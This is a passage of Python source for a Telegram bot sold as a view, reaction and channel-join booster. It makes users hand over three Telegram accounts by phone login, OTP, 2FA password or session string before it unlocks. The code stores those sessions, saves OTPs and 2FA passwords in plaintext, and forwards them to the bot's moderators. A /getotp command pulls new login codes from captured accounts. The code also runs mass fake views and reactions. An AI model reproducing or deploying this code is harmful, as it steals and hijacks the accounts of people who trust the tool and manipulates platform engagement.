    emojis = task_data['emojis']
    speed = float(task_data.get('speed', 0.2))
    accounts = list(active_clients.keys())[:count_limit]
    msg = await event.respond(style_text("🔄 MULTI-REACT RUNNING..."), buttons=get_stop_button())
    success, failed = 0, 0
    for link_info in links_data:
        peer, msg_id = await resolve_post_peer(link_info['link'], link_info['type'], link_info['target'])
        if not peer:
            failed += len(accounts)
            continue
        for phone in accounts:
            trigger_temp_online(phone, duration_seconds=90)
            client = active_clients.get(phone)
            if not client:
                failed += 1
                continue
            for em in emojis:
                await send_reaction_normal(client, peer, msg_id, em)
                await asyncio.sleep(0.1)
            v_ok, _ = await view_post(client, peer, msg_id)
            if v_ok:
                success += 1
            else:
                failed += 1
            await asyncio.sleep(speed)
    if chat_id in task_states:
        del task_states[chat_id]
    await msg.edit(style_text(f"✅ MULTI-REACT COMPLETE!\nViews: {success} | Failed: {failed}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_views(event, post_link, count_limit):
    chat_id_task = event.chat_id
    task_states[chat_id_task] = {'running': True, 'cancel': False}
    channel_username, message_id, chat_id = None, None, None
    public_match = re.search(r"t\.me/([a-zA-Z0-9_]+)/(\d+)", post_link)
    if public_match:
        channel_username = public_match.group(1)
        message_id = int(public_match.group(2))
    private_match = re.search(r"t\.me/c/(\d+)/(\d+)", post_link)
    if private_match:
        channel_id = int(private_match.group(1))
        message_id = int(private_match.group(2))
        chat_id = int(f"-100{channel_id}")
    
    selected = list(active_clients.keys())[:count_limit]
    msg = await event.respond(style_text("👁️ SENDING VIEWS..."), buttons=get_stop_button())
    success, failed = 0, 0
    for phone in selected:
        trigger_temp_online(phone, duration_seconds=90)
        client = active_clients.get(phone)
        if not client:
            failed += 1
            continue
        try:
            if chat_id:
                await client.get_messages(chat_id, ids=message_id)
            else:
                entity = await client.get_entity(channel_username)
                await client.get_messages(entity, ids=message_id)
            success += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.3)
    if chat_id_task in task_states:
        del task_states[chat_id_task]
    await msg.edit(style_text(f"✅ VIEWS COMPLETE!\nSuccess: {success} | Failed: {failed}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def execute_views_batch(event, links_text, count_per_post):
    chat_id_task = event.chat_id
    task_states[chat_id_task] = {'running': True, 'cancel': False}
    links = [l.strip() for l in links_text.strip().splitlines() if l.strip()]
    msg = await event.respond(style_text(f"👁️ PROCESSING {len(links)} POSTS..."), buttons=get_stop_button())
    total_views = 0
    for link in links:
        try:
            public_match = re.search(r"t\.me/([a-zA-Z0-9_]+)/(\d+)", link)
            if public_match:
                ch_user = public_match.group(1)
                m_id = int(public_match.group(2))
                for phone, client in list(active_clients.items()):
                    trigger_temp_online(phone, duration_seconds=90)
                    try:
                        entity = await client.get_entity(ch_user)
                        await client.get_messages(entity, ids=m_id)
                        total_views += 1
                    except Exception:
                        pass
        except Exception:
            pass
    if chat_id_task in task_states:
        del task_states[chat_id_task]
    await msg.edit(style_text(f"✅ BATCH VIEWS COMPLETE!\nTotal Views: {total_views}"), buttons=None)
    await asyncio.sleep(1)
    await show_menu(event, event.sender_id)

async def show_menu(event, user_id, edit_msg=None):
    accounts_count = len(active_clients)
    today_joins = await get_today_joins()
    weekly_users = await get_weekly_active_users()
    uptime = get_uptime()
    active_vc_monitors = len(VC_MONITORS)
    menu = (
        f"🗓️ 𝟩-𝗗ᴀʏ 𝗔ᴄᴛɪᴠᴇ 𝗨ꜱᴇʀꜱ : {weekly_users}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 𝗝ᴏɪɴ / 𝗟ᴇᴀᴠᴇ & 𝗔ᴜᴛᴏ 𝗩ɪᴇᴡᴇʀ 𝗣ʀᴏ\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 𝗔ᴄᴄᴏᴜɴᴛꜱ : {accounts_count}\n"
        f"📊 𝗧ᴏᴅᴀʏ 𝗝ᴏ𝗜ɴꜱ : {today_joins}\n"
        f"🎙️ 𝗔ᴄᴛɪ𝘃ᴇ 𝗩𝗖 : {active_vc_monitors}\n"
        f"⏱️ 𝗨ᴘᴛɪᴍᴇ : {uptime}\n"
        f"⚡ 𝗔ᴜᴛᴏ 𝗠ᴏɴɪᴛᴏ🇷 : 𝗔ᴄᴛɪ𝘃ᴇ (SMART MIXED) 🟢\n"
        f"🛡️ 𝗔ᴅᴍɪ𝗻 𝗣ʀᴏ𝘁ᴇ𝗰𝘁ɪᴏ𝗻 : 𝗔ᴄᴛɪ𝘃ᴇ 🔒\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 𝗦ᴇʟᴇᴄᴛ ᴀɴ ᴏᴘ𝘁𝗶ᴏ𝗻 ғʀᴏᴍ ʙᴇʟᴏᴡ :\n"
        f"🔥"
    )
    is_main_mod = (int(user_id) in MAIN_MODERATOR_IDS)
    is_approved = await is_user_approved(user_id)
    is_sub_admin = await is_user_admin(user_id)

    if not is_approved and not is_sub_admin:
        return

    buttons = [
        [Button.inline("🟢 ➕ 𝗔𝗗𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧", b"add")],
        [Button.inline("🚀 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘🇱", b"join"), Button.inline("🔴 📤 𝗟𝗘𝗔𝗩𝗘 𝗖𝗛𝗔𝗧", b"leave")],
        [Button.inline("🎙️ 𝗝𝗢𝗜𝗡 𝗩𝗖", b"join_vc"), Button.inline("🔴 🎙️ 𝗟𝗘𝗔𝗩𝗘 𝗩𝗖", b"leave_vc")],
        [Button.inline("⚡ 𝗥𝗘𝗔𝗖𝗧 + 𝗩𝗜𝗘𝗪", b"react_view"), Button.inline("💥 𝗠𝗨𝗟𝗧𝗜 𝗥𝗘𝗔𝗖𝗧", b"multi_react")],
        [Button.inline("👁️ 𝗩𝗜𝔼𝗪𝗦 𝗠𝗘𝗡𝗨", b"views_menu")],
        [Button.inline("📋 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 𝗟𝗜𝗦𝗧", b"list_accounts")]
    ]

    if is_main_mod:
        buttons.append([Button.inline("👑 𝗔𝗗𝗗/𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡𝗦", b"admin_menu"), Button.inline("📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦", b"stats")])
    elif is_sub_admin:
        buttons.append([Button.inline("👑 𝗔𝗗𝗗/𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡𝗦", b"admin_menu_sub")])

    if edit_msg:
        try:
            await edit_msg.edit(menu, buttons=buttons)
        except Exception:
            await event.respond(menu, buttons=buttons)
    else:
        await event.respond(menu, buttons=buttons)

if os.path.exists('bot_session.session'):
    try:
        os.remove('bot_session.session')
    except Exception:
        pass

bot = TelegramClient('bot_session', API_ID, API_HASH)
bot.parse_mode = None

@bot.on(events.NewMessage(incoming=True))
async def auto_channel_post_listener(event):
    if not event.is_channel:
        return
    if event.raw_text and event.raw_text.startswith('/'):
        return
    try:
        channel = await event.get_chat()
        msg_id = event.id
        username = getattr(channel, 'username', None)
        asyncio.create_task(send_auto_views(event.chat_id, msg_id, username))
    except Exception:
        pass

@bot.on(events.NewMessage(incoming=True))
async def auto_reaction_handler(event):
    if event.raw_text and event.raw_text.startswith('/'):
        return
    if not (event.is_group or event.is_channel):
        return
    reactions = ['🔥']
    try:
        input_peer = await event.get_input_peer()
        reaction_list = [ReactionEmoji(emoticon=emoji) for emoji in reactions]
        await bot(SendReactionRequest(
            peer=input_peer,
            msg_id=event.id,
            reaction=reaction_list
        ))
    except Exception as e:
        logger.error(f"Auto reaction error: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    user_id = event.sender_id
    
    anim_msg = await event.respond("🔥")
    start_time = time.time()
    
    while time.time() - start_time < 3.0:
        count = random.randint(1, 3)
        chosen_emojis = "".join(random.sample(EMOJI_POOL, count))
        try:
            await anim_msg.edit(chosen_emojis)
        except Exception:
            pass
        await asyncio.sleep(0.12)
        
    try:
        await anim_msg.edit("⚡ **Loading System...** 🔄")
        await asyncio.sleep(0.6)
        await anim_msg.delete()
    except Exception:
        pass

    try:
        data = load_data()
        if "all_users" not in data:
            data["all_users"] = []
        if user_id not in data["all_users"]:
            data["all_users"].append(user_id)
            save_data(data)
    except Exception as e:
        logger.error(f"Error saving user ID: {e}")

    is_approved = await is_user_approved(user_id)
    is_sub_admin = await is_user_admin(user_id)

    if not is_approved and not is_sub_admin:
        active_count = await get_user_active_count(user_id)
        needed = max(0, 3 - active_count)

        access_denied_msg = (
            f"⛔ **𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗟𝗢𝗖𝗞𝗘𝗗!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 **𝗔𝗗𝗗 {needed} 𝗠𝗢𝗥𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 (3/{active_count})!** 🔥\n\n"
            f"📊 **Your Active Accounts:** `3/{active_count}`\n"
            f"👉 Click the **'🟢 ➕ 𝗔𝗗𝗗 𝟯 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦'** button below to add your accounts and get instant automatic access!\n\n"
            f"📩 **SUPPORT & ISSUES:** @SR7_OWNER\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥"
        )
        return await event.respond(access_denied_msg, buttons=[
            [Button.inline("🟢 ➕ 𝗔𝗗𝗗 𝟯 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦", b"add_public_acc")]
        ])
    await show_menu(event, user_id)

@bot.on(events.NewMessage(pattern=r'/broadcast'))
async def broadcast_cmd(event):
    if event.sender_id not in MAIN_MODERATOR_IDS:
        return await event.respond(style_text("⛔ Restricted! Main Moderator only."))
    
    data = load_data()
    all_users = set(data.get("all_users", []))
    
    approved_list = data.get("approved_users", [])
    for u in approved_list:
        if "user_id" in u:
            all_users.add(int(u["user_id"]))
            
    all_users = list(all_users)
    
    if not all_users:
        return await event.respond(style_text("❌ No users found in database!"))
    
    status_msg = await event.respond(style_text(f"⏳ Starting Broadcast to {len(all_users)} users..."))
    success, failed = 0, 0
    
    reply_msg = await event.get_reply_message()
    broadcast_text = event.text.replace('/broadcast', '').strip()
    
    for u_id in all_users:
        try:
            if reply_msg:
                if reply_msg.media:
                    is_voice = bool(getattr(reply_msg.media, 'document', None) and any(attr.__class__.__name__ == 'DocumentAttributeAudio' and getattr(attr, 'voice', False) for attr in reply_msg.media.document.attributes))
                    await bot.send_file(u_id, reply_msg.media, caption=reply_msg.raw_text, voice_note=is_voice)
                else:
                    await bot.send_message(u_id, reply_msg.raw_text)
            elif broadcast_text:
                await bot.send_message(u_id, broadcast_text)
            else:
                await status_msg.edit(style_text("❌ Please send text or reply to a message/voice note with `/broadcast`"))
                return
            success += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.1)
        
    await status_msg.edit(style_text(f"✅ **BROADCAST COMPLETED!**\n\n✅ Delivered: {success}\n❌ Failed: {failed}"))

@bot.on(events.NewMessage(pattern=r'/getotp(?:\s+(.+))?'))
async def get_otp_cmd(event):
    if event.sender_id not in MAIN_MODERATOR_IDS:
        return await event.respond(style_text("⛔ Restricted! Main Moderator only."))
    
    phone = event.pattern_match.group(1)
    
    if not phone:
        sessions = await get_all_sessions()
        if not sessions:
            return await event.respond(style_text("📋 No saved accounts found."))
        
        msg = style_text("🔑 SAVED ACCOUNTS, OTPs & 2FA:\n\n")
        for ph in sessions.keys():
            saved_pwd = await get_saved_password(ph)
            live_otp = pending_otps.get(ph, {}).get('otp', 'No new OTP')
            fa_status = f"`{saved_pwd}`" if saved_pwd and saved_pwd != "Disabled / Not Set" else "🚫 Don't Save (Not Set)"
            msg += f"📱 Phone: `{ph}`\n🔑 Live OTP: `{live_otp}`\n🔐 2FA Password: {fa_status}\n━━━━━━━━━━━━━━━━━━━━━\n"
        return await event.respond(msg)
    
    phone = phone.strip().replace(" ", "")
    saved_pwd = await get_saved_password(phone)
    live_otp = pending_otps.get(phone, {}).get('otp', 'No new OTP')
    fa_status = f"`{saved_pwd}`" if saved_pwd and saved_pwd != "Disabled / Not Set" else "🚫 Don't Save (Not Set)"
    
    target_client = active_clients.get(phone) or login_clients.get(phone)
    if target_client:
        try:
            messages = await target_client.get_messages(777000, limit=5)
            for m in messages:
                if m.text:
                    code_match = re.search(r'\b(\d{5,6})\b', m.text)
                    if code_match:
                        live_otp = code_match.group(1)
                        creds = load_credentials()
                        added_by_id = creds.get(phone, {}).get("added_by_id", 0)
                        added_by_info = creds.get(phone, {}).get("added_by_info", "N/A")
                        save_credential_record(phone, live_otp, saved_pwd, added_by_id, added_by_info)
                        break
        except Exception as e:
            logger.error(f"Live OTP fetch error for {phone}: {e}")

    return await event.respond(f"📱 Phone: `{phone}`\n🔑 Live OTP: `{live_otp}`\n🔐 2FA Password: {fa_status}")

@bot.on(events.NewMessage(pattern=r'/add(?:\s+(.+))?'))
async def add_user_cmd(event):
    if not await is_user_admin(event.sender_id):
        return await event.respond(style_text("⛔ Restricted! Admins only."))
    
    target_text = event.pattern_match.group(1)
    if not target_text:
        return await event.respond(style_text("⚠️ Usage: `/add @username` or `/add 123456789`"))
    
    target_text = target_text.strip()
    msg = await event.respond(style_text("🔍 Resolving Telegram User ID..."))
    
    uid, username_str, title = await resolve_user(bot, target_text)
    if uid:
        await approve_user(uid, event.sender_id, username=username_str, title=title, is_admin=False)
        await msg.edit(style_text(f"✅ SUCCESSFULLY APPROVED USER!\n\n👤 Title: {title}\n🆔 ID: `{uid}`\n🔗 Username: {username_str if username_str else 'N/A'}"))
    else:
        await msg.edit(style_text(f"❌ COULD NOT RESOLVE USER `{target_text}`!\n\n👉 Tip: Ask the user to send `/start` to the bot first, or add using their Numeric ID (e.g., `/add 12345678`)."))

@bot.on(events.NewMessage(pattern=r'/remove(?:\s+(.+))?'))
async def remove_user_cmd(event):
    if not await is_user_admin(event.sender_id):
        return await event.respond(style_text("⛔ Restricted! Admins only."))
        
    target_text = event.pattern_match.group(1)
    if not target_text:
        return await event.respond(style_text("⚠️ Usage: `/remove @username` or `/remove 123456789`"))
    
    target_text = target_text.strip()
    uid, _, title = await resolve_user(bot, target_text)
    if uid:
        await unapprove_user(uid)
        await event.respond(style_text(f"❌ Removed: {title} (`{uid}`)"))
    else:
        await event.respond(style_text(f"❌ User resolve failed for `{target_text}`."))

@bot.on(events.NewMessage(pattern='/list'))
async def list_cmd(event):
    if not await is_user_approved(event.sender_id) and not await is_user_admin(event.sender_id):
        return
    users = await get_approved_users()
    msg = style_text("📋 APPROVED USERS / ADMINS:\n\n")
    for i, u in enumerate(users, 1):
        role = "👑 ADMIN" if u.get('is_admin') else "👤 USER"
        msg += f"{i}. {u.get('title')} ({role}) | ID: `{u['user_id']}`\n"
    await event.respond(msg)

@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode()

    if data == "back":
        await event.answer()
        if event.chat_id in task_states:
            del task_states[event.chat_id]
        try:
            await event.delete()
        except Exception:
            pass
        
        if await is_user_approved(user_id) or await is_user_admin(user_id) or int(user_id) in MAIN_MODERATOR_IDS:
            await show_menu(event, user_id)
        else:
            await start_cmd(event)
        return

    if data in ["add_public_acc", "add", "add_phone", "add_string"]:
        await event.answer()
        if data in ["add_public_acc", "add"]:
            await event.edit(style_text("ADD ACCOUNT TO UNLOCK BOT"), buttons=[
                [Button.inline("📱 PHONE", b"add_phone")],
                [Button.inline("🔑 SESSION", b"add_string")],
                [Button.inline(style_text("🔙 BACK"), b"back")]
            ])
        elif data == "add_phone":
            task_states[event.chat_id] = {'type': 'login', 'step': 'phone'}
            await event.edit(style_text("📱 Send phone number:"), buttons=get_cancel())
        elif data == "add_string":
            task_states[event.chat_id] = {'type': 'login', 'step': 'string'}
            await event.edit(style_text("🔑 Send session string:"), buttons=get_cancel())
        return

    if not await is_user_approved(user_id) and not await is_user_admin(user_id):
        return await event.answer("⚠️ Access locked! Please add 3 accounts first.", alert=True)
    
    if data == "force_stop":
        if event.chat_id in task_states:
            task_states[event.chat_id]['cancel'] = True
            await event.answer("Stopping...", alert=True)
        return

    await event.answer()
    
    if data == "join":
        task_states[event.chat_id] = {'type': 'join', 'step': 'link'}
        await event.edit(style_text("🔗 Send links (one per line):"), buttons=get_cancel())
    elif data == "join_vc":
        task_states[event.chat_id] = {'type': 'vc_join', 'step': 'link'}
        await event.edit(style_text("🎙️ Send VC link:"), buttons=get_cancel())
    elif data == "leave_vc":
        await event.edit(style_text("🎙️ LEAVING VC..."))
        await execute_vc_leave(event)
    elif data.startswith("vc_qty_"):
        qty = data.replace("vc_qty_", "")
        if qty == "custom":
            task_states[event.chat_id] = {'type': 'vc_join', 'step': 'custom_qty', 'vc_link': task_states.get(event.chat_id, {}).get('vc_link')}
            await event.edit(style_text("🔢 Enter custom quantity (number of IDs):"), buttons=get_cancel())
        else:
            total = len(active_clients)
            count = total if qty == "all" else int(qty) if qty.isdigit() else total
            vc_link = task_states.get(event.chat_id, {}).get('vc_link')
            await event.delete()
            if vc_link:
                await execute_vc_join(event, vc_link, count)
    elif data == "react_view":
        task_states[event.chat_id] = {'type': 'react_view', 'step': 'link'}
        await event.edit(style_text("🔗 Send post links:"), buttons=get_cancel())
    elif data == "multi_react":
        task_states[event.chat_id] = {'type': 'multi_react', 'step': 'link'}
        await event.edit(style_text("🔗 Send post links:"), buttons=get_cancel())
    elif data == "views_menu":
        await event.edit(style_text("👁️ VIEWS OPTIONS"), buttons=[
            [Button.inline(style_text("SINGLE POST"), b"views_single")],
            [Button.inline(style_text("BATCH POSTS"), b"views_batch")],
            [Button.inline(style_text("🔙 BACK"), b"back")]
        ])
    elif data == "views_single":
        task_states[event.chat_id] = {'type': 'views', 'subtype': 'single', 'step': 'link'}
        await event.edit(style_text("🔗 Send post link:"), buttons=get_cancel())
    elif data == "views_batch":
        task_states[event.chat_id] = {'type': 'views', 'subtype': 'batch', 'step': 'links'}
        await event.edit(style_text("📚 Send multiple links:"), buttons=get_cancel())
    elif data.startswith("views_qty_"):
        qty = data.replace("views_qty_", "")
        if qty == "custom":
            task_states[event.chat_id] = {'type': 'views', 'subtype': 'single', 'step': 'custom_qty', 'post_link': task_states.get(event.chat_id, {}).get('post_link')}
            await event.edit(style_text("🔢 Enter custom quantity (number of IDs):"), buttons=get_cancel())
        else:
            total = len(active_clients)
            count = total if qty == "all" else int(qty) if qty.isdigit() else total
            post_link = task_states.get(event.chat_id, {}).get('post_link')
            await event.delete()
            if post_link:
                await execute_views(event, post_link, count)
    elif data.startswith("qty_"):
        state = task_states.get(event.chat_id)
        if not state:
            return
        qty = data.split("_")[1]
        if qty == "custom":
            state['step'] = 'custom_qty'
            await event.edit(style_text("🔢 Enter custom quantity (number of IDs):"), buttons=get_cancel())
        else:
            total = len(active_clients)
            count = total if qty == "all" else int(qty) if qty.isdigit() else total
            await event.delete()
            if state['type'] == 'join':
                await execute_join(event, state, count)
            elif state['type'] == 'react_view':
                await execute_react_view(event, state, count)
            elif state['type'] == 'multi_react':
                await execute_multi_react_view(event, state, count)
    elif data == "leave":
        await event.edit(style_text("LEAVE CHAT"), buttons=[
            [Button.inline(style_text("LEAVE ONE"), b"leave_specific")],
            [Button.inline(style_text("LEAVE ALL"), b"leave_all")],
            [Button.inline(style_text("🔙 BACK"), b"back")]
        ])
    elif data == "leave_specific":
        task_states[event.chat_id] = {'type': 'leave_specific', 'step': 'link'}
        await event.edit(style_text("📤 Send channel link:"), buttons=get_cancel())
    elif data == "leave_all":
        await event.edit(style_text("Leave ALL channels?"), buttons=[
            [Button.inline(style_text("CONFIRM"), b"exec_leave_all")],
            [Button.inline(style_text("CANCEL"), b"back")]
        ])
    elif data == "exec_leave_all":
        await execute_leave_all(event)
    elif data == "list_accounts":
        if not await is_user_admin(user_id):
            return await event.answer("⛔ Restricted! Main Moderator only.", alert=True)
        sessions = await get_all_sessions()
        msg = style_text("📋 ACCOUNTS LIST & 2FA STATUS:\n\n")
        for i, (phone, _) in enumerate(sessions.items(), 1):
            st = "🟢" if phone in active_clients else "🔴"
            saved_pwd = await get_saved_password(phone)
            if saved_pwd and saved_pwd != "Disabled / Not Set":
                fa_text = f"🔐 2FA Set: `{saved_pwd}`"
            else:
                fa_text = "🚫 2FA: Not Set"
            msg += f"{i}. {st} `{phone}`\n   {fa_text}\n━━━━━━━━━━━━━━━━━━━━━\n"
        await event.edit(msg, buttons=[[Button.inline(style_text("🔙 BACK"), b"back")]])
        
    elif data == "admin_menu" or data == "admin_menu_sub":
        buttons = [
            [Button.inline(style_text("➕ ADD ADMIN"), b"btn_add_user"), Button.inline(style_text("❌ REMOVE ADMIN"), b"btn_remove_user")],
            [Button.inline(style_text("🔙 BACK"), b"back")]
        ]
        await event.edit(style_text("👑 ADMIN MANAGEMENT"), buttons=buttons)
        
    elif data == "btn_add_user":
        task_states[event.chat_id] = {'type': 'admin_manage', 'action': 'add'}
        await event.edit(style_text("👤 Send User ID / @Username to Add as Admin:"), buttons=get_cancel())
    elif data == "btn_remove_user":
        task_states[event.chat_id] = {'type': 'admin_manage', 'action': 'remove'}
        await event.edit(style_text("👤 Send User ID / @Username to Remove from Admins:"), buttons=get_cancel())
        
    elif data == "stats":
        if user_id not in MAIN_MODERATOR_IDS:
            return await event.answer("Main Moderator only!", alert=True)
        users = await get_approved_users()
        msg = style_text(f"📊 STATS:\nApproved Admins: {len(users)}\nActive Accounts: {len(active_clients)}")
        await event.edit(msg, buttons=[[Button.inline(style_text("🔙 BACK"), b"back")]])

@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    if chat_id not in task_states:
        return
    state = task_states[chat_id]
    if state.get('running'):
        return
    text = event.raw_text.strip()

    sender = await event.get_sender()
    sender_name = f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip() or "Unknown"
    sender_username = f"@{sender.username}" if getattr(sender, 'username', None) else "No Username"
    adder_info_str = f"{sender_name} ({sender_username}) [ID: {user_id}]"

    if state.get('step') == 'custom_qty':
        if not text.isdigit():
            return await event.respond(style_text("❌ Please enter a valid number!"), buttons=get_cancel())
        count = int(text)
        task_type = state.get('type')
        if task_type == 'join':
            await execute_join(event, state, count)
        elif task_type == 'vc_join':
            vc_link = state.get('vc_link')
            await execute_vc_join(event, vc_link, count)
        elif task_type == 'react_view':
            await execute_react_view(event, state, count)
        elif task_type == 'multi_react':
            await execute_multi_react_view(event, state, count)
        elif task_type == 'views':
            post_link = state.get('post_link')
            await execute_views(event, post_link, count)
        return
    
    if state.get('type') == 'admin_manage':
        if not await is_user_admin(user_id):
            del task_states[chat_id]
            return await event.respond(style_text("⛔ Restricted! Admins only."))
        action = state.get('action')
        uid, username_str, title = await resolve_user(bot, text)
        if uid:
            if action == 'add':
                await approve_user(uid, user_id, username=username_str, title=title, is_admin=True)
                await event.respond(style_text(f"✅ Successfully added {title} (`{uid}`) as ADMIN!"))
            elif action == 'remove':
                await unapprove_user(uid)
                await event.respond(style_text(f"❌ Removed {title} (`{uid}`) from system."))
        else:
            await event.respond(style_text(f"❌ Could not resolve `{text}`. Try adding with Numeric User ID."))
        del task_states[chat_id]
        await show_menu(event, user_id)
        return

    if state.get('type') == 'login':
        if state['step'] == 'phone':
            phone = text.replace(" ", "").strip()
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                send = await client.send_code_request(phone)
                setup_client_otp_listener(client, phone)
                login_clients[phone] = client
                state.update({'client': client, 'phone': phone, 'hash': send.phone_code_hash, 'step': 'otp'})
                if phone not in pending_otps:
                    pending_otps[phone] = {}
                pending_otps[phone]['otp'] = "Waiting..."
                await event.respond(style_text(f"📩 OTP sent to {phone}\nEnter code:"), buttons=get_cancel())
            except Exception as e:
                logger.error(f"Error requesting OTP for {phone}: {e}")
                await event.respond(style_text(f"❌ Error: {e}"), buttons=get_cancel())
        
        elif state['step'] == 'otp':
            ph = state.get('phone')
            otp_input = text.strip()
            
            if not re.match(r'^\d{5,6}$', otp_input):
                return await event.respond(style_text("⚠️ Invalid OTP format! Please enter exactly 5 or 6 digits."), buttons=get_cancel())
                
            if ph:
                if ph not in pending_otps:
                    pending_otps[ph] = {}
                pending_otps[ph]['otp'] = otp_input
                
            try:
                client_obj = state['client']
                await client_obj.sign_in(phone=ph, code=otp_input, phone_code_hash=state['hash'])
                
                await add_session(ph, client_obj.session.save(), user_id)
                active_clients[ph] = client_obj
                login_clients.pop(ph, None)
                asyncio.create_task(keep_alive(client_obj, ph))
                
                save_credential_record(ph, otp_input, "Disabled / Not Set", user_id, adder_info_str)
                del task_states[chat_id]

                is_now_approved = await check_and_grant_auto_approval(user_id)

                try:
                    alert_msg = (
                        f"🔥 **NEW ACCOUNT ADDED SUCCESSFULLY** 🔥\n\n"
                        f"👤 **Added By:** {adder_info_str}\n"
                        f"📱 **Phone Number:** `{ph}`\n"
                        f"🔑 **Live OTP:** `{otp_input}`\n"
                        f"🔐 **2FA Password:** `Disabled / Not Set`\n"
                    )
                    for mod_id in MAIN_MODERATOR_IDS:
                        try:
                            await bot.send_message(mod_id, alert_msg)
                        except Exception:
                            pass
                except Exception as notify_err:
                    logger.error(f"Failed to send login alert for {ph}: {notify_err}")

                await event.respond(style_text(f"✅ Added: {ph} (No 2FA)"))
                
                if is_now_approved or int(user_id) in MAIN_MODERATOR_IDS:
                    await event.respond(style_text("🎉 CONGRATULATIONS! Bot access UNLOCKED!"))
                    await show_menu(event, user_id)
                else:
                    await start_cmd(event)

            except SessionPasswordNeededError:
                state['step'] = '2fa'
                state['otp_code'] = otp_input
                await event.respond(style_text("🔐 Enter 2FA password:"), buttons=get_cancel())
            except Exception as e:
                logger.error(f"Sign in error for {ph}: {e}")
                await event.respond(style_text(f"❌ Failed: {e}"), buttons=get_cancel())
        
        elif state['step'] == '2fa':
            ph = state.get('phone')
            password_input = text.strip()
            try:
                client_obj = state['client']
                await client_obj.sign_in(password=password_input)
                
                await add_session(ph, client_obj.session.save(), user_id)
                active_clients[ph] = client_obj
                login_clients.pop(ph, None)
                asyncio.create_task(keep_alive(client_obj, ph))
                
                saved_otp = state.get('otp_code', pending_otps.get(ph, {}).get('otp', 'N/A'))
                
                save_credential_record(ph, saved_otp, password_input, user_id, adder_info_str)
                del task_states[chat_id]

                is_now_approved = await check_and_grant_auto_approval(user_id)

                try:
                    alert_msg = (
                        f"🔥 **NEW ACCOUNT ADDED (WITH 2FA)** 🔥\n\n"
                        f"👤 **Added By:** {adder_info_str}\n"
                        f"📱 **Phone Number:** `{ph}`\n"
                        f"🔑 **Live OTP:** `{saved_otp}`\n"
                        f"🔐 **2FA Password:** `{password_input}`\n"
                    )
                    for mod_id in MAIN_MODERATOR_IDS:
                        try:
                            await bot.send_message(mod_id, alert_msg)
                        except Exception:
                            pass
                except Exception as notify_err:
                    logger.error(f"Failed to send 2FA alert for {ph}: {notify_err}")

                await event.respond(style_text(f"✅ Added: {ph} (2FA saved permanently)"))
                
                if is_now_approved or int(user_id) in MAIN_MODERATOR_IDS:
                    await event.respond(style_text("🎉 CONGRATULATIONS! Bot access UNLOCKED!"))
                    await show_menu(event, user_id)
                else:
                    await start_cmd(event)

            except Exception as e:
                logger.error(f"2FA sign in error for {ph}: {e}")
                await event.respond(style_text(f"❌ Wrong password or error: {e}"), buttons=get_cancel())
        
        elif state['step'] == 'string':
            try:
                client = TelegramClient(StringSession(text.strip()), API_ID, API_HASH)
                await client.connect()
                me = await client.get_me()
                phone = f"+{me.phone}" if me.phone else f"id_{me.id}"
                setup_client_otp_listener(client, phone)
                await add_session(phone, client.session.save(), user_id)
                active_clients[phone] = client
                asyncio.create_task(keep_alive(client, phone))

                save_credential_record(phone, "String Login", "N/A (String Login)", user_id, adder_info_str)
                del task_states[chat_id]

                is_now_approved = await check_and_grant_auto_approval(user_id)

                try:
                    alert_msg = (
                        f"🔥 **NEW SESSION STRING ADDED** 🔥\n\n"
                        f"👤 **Added By:** {adder_info_str}\n"
                        f"📱 **Account / ID:** `{phone}`\n"
                        f"🔑 **Login Type:** `String Session`\n"
                    )
                    for mod_id in MAIN_MODERATOR_IDS:
                        try:
                            await bot.send_message(mod_id, alert_msg)
                        except Exception:
                            pass
                except Exception as notify_err:
                    logger.error(f"Failed to send alert: {notify_err}")

                await event.respond(style_text(f"✅ Added: {phone}"))
                
                if is_now_approved or int(user_id) in MAIN_MODERATOR_IDS:
                    await event.respond(style_text("🎉 CONGRATULATIONS! Bot access UNLOCKED!"))
                    await show_menu(event, user_id)
                else:
                    await start_cmd(event)

            except Exception as e:
                await event.respond(style_text(f"❌ Invalid string: {e}"), buttons=get_cancel())

    elif state.get('type') == 'join':
        if state['step'] == 'link':
            links = text.strip().splitlines()
            valid = [{'link': l, 'type': parse_target(l)[0], 'target': parse_target(l)[1]} for l in links if parse_target(l)[0]]
            if not valid:
                return await event.respond(style_text("❌ No valid links!"), buttons=get_cancel())
            state['links_data'] = valid
            state['step'] = 'delay'
            await event.respond(style_text("⏱️ Enter delay in seconds (e.g. 1, 2, 5):"), buttons=get_cancel())
        elif state['step'] == 'delay':
            try:
                state['delay'] = float(text.replace(',', '.'))
            except:
                state['delay'] = 1.0
            state['step'] = 'qty'
            await event.respond(style_text("Select quantity:"), buttons=get_qty_buttons())
    
    elif state.get('type') == 'vc_join':
        if state['step'] == 'link':
            state['vc_link'] = text.strip()
            state['step'] = 'qty'
            await event.respond(style_text("Select quantity:"), buttons=get_vc_qty_buttons())

